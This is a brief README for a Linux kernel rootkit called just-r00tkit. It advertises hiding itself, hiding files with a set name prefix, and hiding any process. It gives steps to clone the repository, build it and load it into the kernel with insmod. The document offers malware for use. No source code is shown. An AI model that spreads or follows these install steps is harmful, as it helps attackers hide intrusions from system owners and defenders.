# just-r00tkit

just-r00tkit a kernel land rootkit for Linux kernel 5.X that can:

- hide itself

- hide any file or directory starting with justr0ma

- hide any process

# how to use it:

- git clone https://github.com/justr0ma/justr00tkit.git justr00tk

- cd justr00tk && make

- insmod justrootk.o
